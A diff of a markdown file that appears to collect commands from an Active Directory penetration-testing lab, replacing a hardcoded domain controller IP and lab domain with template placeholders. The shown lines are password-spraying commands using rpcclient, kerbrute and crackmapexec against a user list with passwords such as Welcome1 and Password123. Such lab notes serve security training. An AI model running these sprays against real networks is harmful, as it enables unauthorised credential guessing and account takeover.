@@ -9,25 +9,25 @@
 ## 1. `shellsession` _(output omitted)_
 
 ```bash
-for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" {{DC_IP}} | grep Authority; done
 ```
 
 ## 2. `shellsession` _(output omitted)_
 
 ```bash
-kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+kerbrute passwordspray -d {{DOMAIN}} --dc {{DC_IP}} valid_users.txt  Welcome1
 ```
 
 ## 3. `shellsession` _(output omitted)_
 
 ```bash
-sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+sudo crackmapexec smb {{DC_IP}} -u valid_users.txt -p Password123 | grep +
 ```
 
 ## 4. `shellsession` _(output omitted)_
 
 ```bash
-sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
+sudo crackmapexec smb {{DC_IP}} -u avazquez -p Password123
 ```
 
 ## 5. `shellsession` _(output omitted)_
